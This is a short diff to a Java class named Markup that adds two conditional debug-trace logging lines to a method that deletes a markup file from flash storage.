@@ -297,6 +297,10 @@ public class Markup {
      * Removes the markup.
      */
     public synchronized void removeMarkup() {
+        
+        //#ifdef DEBUG_TRACE
+        debug.trace("removeMarkup: ");
+        //#endif
         //#ifdef DBC
         Check.requires(agentId > 0, "agentId null");
         //#endif
@@ -306,6 +310,9 @@ public class Markup {
         Check.asserts(markupName != "", "markupName empty");
         //#endif
 
+        //#ifdef DEBUG_TRACE
+        debug.trace("removeMarkup: "+markupName);
+        //#endif
         final AutoFlashFile remove = new AutoFlashFile(markupName, true);
         remove.delete();
     }
